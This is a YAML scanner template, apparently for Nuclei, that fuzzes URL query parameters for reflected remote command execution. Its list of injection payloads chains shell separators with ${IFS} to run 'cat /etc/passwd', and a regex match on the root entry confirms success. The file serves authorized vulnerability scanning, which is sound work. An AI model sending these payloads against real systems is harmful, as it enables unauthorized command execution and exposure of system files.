http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - '&&${IFS}cat${IFS}/etc/passwd'
    - '&${IFS}cat${IFS}/etc/passwd&'
    - '&&${IFS}cat${IFS}/etc/passwd&&'
    - '||${IFS}cat${IFS}/etc/passwd'
    - '||${IFS}cat${IFS}/etc/passwd||'
    - ;${IFS}cat${IFS}/etc/passwd
  stop-at-first-match: true
id: jaeles-signatures-rce
info:
  author: reewardius
  name: Reflected RCE Jaeles
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
